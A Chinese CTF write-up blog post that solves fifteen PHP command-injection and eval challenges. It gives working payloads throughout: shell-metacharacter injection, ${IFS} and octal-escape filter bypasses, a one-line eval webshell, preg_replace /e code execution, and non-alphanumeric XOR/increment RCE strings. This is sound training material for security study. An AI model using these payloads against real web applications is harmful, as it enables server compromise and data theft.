---
title: CMD简单的命令执行
date: 2026-05-17 16:01:50
categories:
  - CTF
tags:
  - CTF
  - CMD
description: 一些 CMD 题目的题解
cover: /img/cover-tech.svg
comments: true
---

## 第一题

![image-20260511220048214](/img/posts/cmdstudy/01.webp)

![image-20260511220345000](/img/posts/cmdstudy/02.webp)

![image-20260511220427244](/img/posts/cmdstudy/03.webp)

`escapeshellcmd($_POST['cmd'])` 中的 `escapeshellcmd()` 函数主要用于**转义用户输入中的特殊字符**，防止攻击者通过构造恶意命令实现**命令注入攻击**。所以直接在目录下找到flag的文件后，直接查找flag即可。

## 第二题

![image-20260512183345703](/img/posts/cmdstudy/04.webp)

通过分析这道题目的代码，发现依旧通过post方式输入cmd，并且cmd要拼接在ping -c 5 后面，system（）的作用是执行系统命令，输入cmd=127.0.0.1;ls 发现返回的是index.php 返回上一集目录，并且它对字符没有限制，直接进行查找，发现在第三层目录下找到了flag，直接查看flag。

```
cmd=|ls ../../../
```

```
cmd=|cat ../../../flag
```

![image-20260512184621356](/img/posts/cmdstudy/05.webp)

## 第三题

![image-20260512203029981](/img/posts/cmdstudy/06.webp)

![image-20260512204125861](/img/posts/cmdstudy/07.webp)

![image-20260512204353951](/img/posts/cmdstudy/08.webp)

\>/dev/null在这里的意思是在页面不回显，所以我们要绕过该代码·，可以使用下面代码找到文件后查看flag即可

```
cmd=ls /; 或者 /|| 或者/%0a
```

## 第四题

  ![image-20260513161629149](/img/posts/cmdstudy/09.webp)

看过函数以后发现一个新的函数（strpos` 函数），用于查找字符串在另一字符串中首次出现的位置（返回索引整数），如果未找到则返回 `false

题目中要求if (strpos($cmd, ' ') !== false)检查指令中是否包含空格，如果包含空格，则会终止命令输出nospaceallwoed，所以我们首先解决空格过滤这个问题，然后解决不回显的问题，在解决空格过滤的问题，有几种方法

```
1.使用${IFS} 2使用${IFS}$9 这个在某些环境下更加的稳定3.重定向符<
```

然后进行对不回显的问解决即可拿到flag

![image-20260513163020214](/img/posts/cmdstudy/10.webp)

![image-20260513163100277](/img/posts/cmdstudy/11.webp)

## 第五题

该题点进去发现一只蜘蛛，打开源码发现有个robot，猜测可能要使用robots.txt，发现有个Disallow: 4atP5Aup.php，这大概率就是源码所在地，试着访问一下，得到下面的代码preg_match是黑名单匹配，如果有结果会直接过滤，所以

```php
<?php

error_reporting(0);
if (isset($_POST['cmd'])) {
    $cmd = escapeshellcmd($_POST['cmd']);
    if (!preg_match('/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|{|}|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\'|\"|id|whoami/i', $cmd)) {
        system($cmd);
    }
}
show_source(__FILE__);
?>
```

```
escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system 函数，或者执行操作符之前进行转义。

反斜线（\）会在以下字符之前插入：& # ; ` | * ? ~ <> ^ () [] {} $ \、\x0A 和 \xFF。 ' 和 " 仅在不配对儿的时候被转义。在 Windows 平台上，所有这些字符以及 % 和 ! 字符前面都有一个插入符号（^）。
```

在第一题中使用过该函数，得知其会进行转义，所以我们要 通过一些特定的·东西去构造payload。在bp里面进行post请求,最后构造出cmd=c%0aat%20/fl%20aag.

```
理想payload
cmd=c
at /fl
ag
```

![image-20260513180419411](/img/posts/cmdstudy/12.webp)

## 第六题

```php
<?php
//flag在/flag.txt文件中
error_reporting(0);
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    if (preg_match('/[a-zA-Z]/', $cmd)) {
        die('no letter allowed');
    }
    system($cmd);
}
show_source(__FILE__);
?>
```

该题说flag在flag.txt中，但是搜索返回了404，再往下看发现其过滤了所有a到z的大小写字母，代码中没有过滤数字，可以用特殊方式进行转义，使用 ANSI-C 风格的转义，格式为 `$'...'`，，省略号中用八进制数代替，所以我们将flag.txt转换为八进制

```
cmd=$'\143\141\164' $'\57\146\154\141\147\56\164\170\164'
```

这就是cat  /flag.txt的转义

## 第七题

```php
<?php @eval($_POST['qc']);
show_source(__FILE__);
?>
```

这是一个简洁的木马代码，非常高效，第一种想到用蚁剑或者菜刀啥的，直接输入qc查看。第二种则是直接hackbar中将qc作为参数使用system函数直接操作

```
先找一下flag位置qc=system('ls /');      qc=system('cat /flag');
```

![image-20260513200232223](/img/posts/cmdstudy/13.webp)

## 第八题

```php
<?php
error_reporting(0);
if(isset($_GET['qc'])){
    $qc = $_GET['qc'];
    if(!preg_match("/flag/i", $qc)){
        eval($qc);
    }
}else{
    highlight_file(__FILE__);
}
?>
```

通过代码分析其把flag过滤掉了，首先尝试了？qc=inforo()发现有问题，找不到flag，然后尝试下面的代码最后成功找到了flag。（*和？都是通配符其中*    （*）可以代替后续代码，而？只能代替一个字符）

```
?qc=system('ls /');找到目录     ?qc=system('cat /f*')l;
```

![image-20260513201652105](/img/posts/cmdstudy/14.webp)

## 第九题

```php
<?php
error_reporting(0);
if(isset($_GET['qc'])){
    $qc = $_GET['qc'];
    if(!preg_match("/flag|system/i", $qc)){
        eval($qc);
    }
}else{
    highlight_file(__FILE__);
}
?>
```

这道题由于过滤了flag和system，所以可以找其他平替,期间发现空格也被过滤直接使用${IFS}$9其中的$9可有可无就是一个普通的连接符

```
如果system()被阻止，PHP 还有很多其他函数可以实现相同的功能：
passthru()
shell_exec()
`（反引号）
exec()
```

![image-20260513210119121](/img/posts/cmdstudy/15.webp)

## 第十题

```php
<?php
error_reporting(0);
if(isset($_GET['qc'])){
    $qc = $_GET['qc'];
    if(!preg_match("/system| /i", $qc)){
        eval($qc);
    }
}else{
    highlight_file(__FILE__);
}
?>
```

和上面的题一样，其过滤了system，和空格，用${IFS}代替即可

![image-20260513210848000](/img/posts/cmdstudy/16.webp)

## 第十一题

```php
<?php
error_reporting(0);
if(isset($_GET['qc'])){
    $qc = $_GET['qc'];
    if(!preg_match("/;/i", $qc)){
        eval($qc);
    }
}else{
    highlight_file(__FILE__);
}
?>
//flag在根目录的flag.txt文件中 //flag在根目录的flag.txt文件中
```

文件底部已经说明flag在根目录，并且发现它把；给过滤了所以直接用？>代替即可

![image-20260513212113837](/img/posts/cmdstudy/17.webp)

## 第十二题

```php
<?php
//flag在flag.php文件中
error_reporting(0);
if(isset($_GET['qc'])){
    $qc = $_GET['qc'];
    if(!preg_match("/;/i", $qc)){
        eval($qc);
    }
 
}else{
    highlight_file(__FILE__);
}
?>
```

本题过滤了：依旧用？>来代替，，并且其说到文件在.php文件中，在输入

```http
?qc=passthru('cat${IFS}f*')?>后发现无回显，然后我直接将cat换为tac即可得到flag
```

![image-20260514172247691](/img/posts/cmdstudy/18.webp)

## 第十三题

```php
<?php
//flag在flag.php文件中
error_reporting(0);
if (isset($_GET['qc'])) {
    $qc = $_GET['qc'];
    if (!preg_match("/['\"\?<>\.\$\{\}:\\\\~^@*\-+=\[\]\,]/", $qc)) {
        eval($qc);
    }
} else {
    highlight_file(__FILE__);
}
?>
```

首先发现过滤了 `' " ? <> . $ {} : \ ~ ^  * - + = [] ,`，所以难以构造flag.php的文件。所以考虑使用特殊函数进行无参数的rce绕过

```
localeconv()` 函数返回一个包含本地化数字和货币格式信息的数组。该数组的第一个元素通常是一个点 `.
```

```php
print_r(scandir(pos(localeconv())))
```

使用改代码发现flag的文件在该目录下，然后直接查找改代码，通过套娃，移动指针来回显flag。

```php
show_source(next(array_reverse(scandir(pos(localeconv())))));
```

```php
?qc=eval(next(current(get_defined_vars())));&a=system('tac flag.php');
```

![image-20260514174943306](/img/posts/cmdstudy/19.webp)

## 第十四题

```php
<?php
$re = isset($_GET['re']) ? $_GET['re'] : '';
$str = isset($_GET['str']) ? $_GET['str'] : '';

if ($re === '' || $str === '') {
    highlight_file(__FILE__);
    exit;
}

echo preg_replace(
    '/(' . $re . ')/ei',
    'strtolower("\\1")',
    $str
);
```

```php
preg_replace() (/e 模式)

(PHP 7.0 移除)， /e 修饰符会让正则替换后的字符串作为 PHP 代码执行。

php
自动换行复制
<?php preg_replace("/test/e", $_POST["cmd"], "just test case"); ?>
POST Payload: cmd=system('whoami')
```

`\\1` 是一个动态占位符，指把前面正则表达式里第一个匹配到的实际内容替换到这个位置。

分析代码，re和str均传入非空，.*表示匹配所有的字符，并且在php语言中碰到花括号一般都是先执行括号里面的语句。

```php
?re=.*&str=${phpinfo()}
```

所以我们可以传入简单的木马

```http
?re=.*&str=${system($_GET[1])}&1=cat /flag
```

## 第十五题

```php
<?php
error_reporting(0);
if(isset($_GET['qc'])){
    $qc = $_GET['qc'];
    if(!preg_match("/[a-zA-Z0-9]/", $qc)){
        eval($qc);
    }
}else{
    highlight_file(__FILE__);
}
?>
```

看完代码后发现其将所有的子母和数字全部都过滤完了 

无字母数字 RCE ，这里提供五种解法：

1. 异或绕过：

   利用 PHP 允许对字符串进行按位异或运算的特性，将两个非字母数字的字符进行异或（

   ```
   ^
   ```

   ），使其底层的 ASCII 码位运算结果正好等于需要的字母。

   http

   自动换行复制

   ```http
   ?qc=('%08%02%08%08%05%0d'^'%7b%7b%7b%7c%60%60')('%03%01%08%00%00%06%0c%01%07'^'%60%60%7c%20%2f%60%60%60%60');
   ```

2. 或运绕过：

   利用 PHP 的按位或运算（

   ```
   |
   ```

   ），将两个精心挑选的非字母数字字符的 ASCII 码进行二进制或操作，拼凑出目标字母。

   http

   自动换行复制

   ```http
   ?qc=('%13%19%13%14%05%0d'|'%60%60%60%60%60%60')('%03%01%14%00%00%06%0c%01%07'|'%60%60%60%20%2f%60%60%60%60');
   ```

3. 取反绕过：

   利用 PHP 的按位取反操作（

   ```
   ~
   ```

   ），将目标字母的 ASCII 码进行按位取反得到不可见的单字节字符，在执行时再对该不可见字符使用

    

   ```
   ~
   ```

    

   操作符即可将其还原回原始字母。

   http

   自动换行复制

   ```http
   ?qc=(~'%8c%86%8c%8b%9a%92')(~'%9c%9e%8b%df%d0%99%93%9e%98');
   ```

4. 自增绕过：

   利用 PHP 弱类型隐式转换结合 Perl 风格的字符串自增特性（

   ```
   ++
   ```

   ），先通过特殊符号组合提取出基础字母（如从

    

   ```
   "Array"
   ```

    

   提取

    

   ```
   A
   ```

    

   或

    

   ```
   a
   ```

   ），再通过连续自增推导出所需的函数名。

   http

   自动换行复制

   ```http
   ?qc=$_=[];$_=@"$_";$_=$_[ "!"=="@" ];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$_++;$____=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_____=$_;$_++;$______=$_;$_++;$_++;$_++;$_++;$_++;$_______=$_;$________=$_____;$________.=$_______;$________.=$_____;$________.=$______; $________.=$__; $________.=$____;$__________="_";$__________.=$___;$__________.=$__; $__________.=$______; $________(${$__________}["_"]);
   ```

   即

    

   ```
   SYSTEM(${"_GET"}["_"]);
   ```

    

   ，用参数

    

   ```
   _
   ```

    

   进行命令执行即可。但是参数值里面有

    

   ```
   +
   ```

    

   ，需要先进行一次 URL 编码才能用 hackbar 传参，否则会被解析成空格。

   http

   自动换行复制

   ```http
   ?qc=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B%20%22!%22%3D%3D%22%40%22%20%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24____%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_____%3D%24_%3B%24_%2B%2B%3B%24______%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_______%3D%24_%3B%24________%3D%24_____%3B%24________.%3D%24_______%3B%24________.%3D%24_____%3B%24________.%3D%24______%3B%20%24________.%3D%24__%3B%20%24________.%3D%24____%3B%24__________%3D%22_%22%3B%24__________.%3D%24___%3B%24__________.%3D%24__%3B%20%24__________.%3D%24______%3B%20%24________(%24%7B%24__________%7D%5B%22_%22%5D)%3B&_=cat /flag
   ```

5. 临时文件绕过：

   利用向 PHP 发送 POST 文件上传请求时，系统会自动在

    

   ```
   /tmp
   ```

    

   目录下生成随机文件名的临时文件的特性，通过纯符号构造的 Linux 通配符去匹配并执行该临时文件中的恶意代码。

   首先做一个可以上传文件的网页：

   html

   自动换行复制

   ```html
   <!DOCTYPE html>
   <html lang="en">
   <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>POST数据包POC</title>
   </head>
   <body>
   <form action="http://docker.qingcen.net:43066/" method="post" enctype="multipart/form-data">
   <label for="file">文件名：</label>
       <input type="file" name="file" id="file"><br>
       <input type="submit" name="submit" value="提交">
   </form>
   </body>
   </html>
   ```

   然后上传一个

   ```
   shell.sh
   ```

   文件并用bp抓包

   1. 传入：

      http

      自动换行复制

      ```http
      ?qc=%3F%3E%3C%3F%3D%60.%20%2F%3F%3F%3F%2F%3F%3F%3F%3F%3F%3F%3F%3F%5B%40-%5B%5D%60%3B
      ```

      即

       

      ```
      ?qc=?><?=`. /???/????????[@-[]`;
      ```

       

      如果源码不是

       

      ```
      eval($qc);
      ```

       

      而是

       

      ```
      system($qc);
      ```

       

      ，只需要传入

       

      ```
      ?qc=. /???/????????[@-[]
      ```

   2. ```
      shell.sh
      ```

      的文件内容改成：

      sh

      自动换行复制

      ```sh
      #!/bin/sh
      cat /flag
      ```

   如果没有回显就多发送几次。
所有题目均由青岑提供，若有侵权，请及时联系作者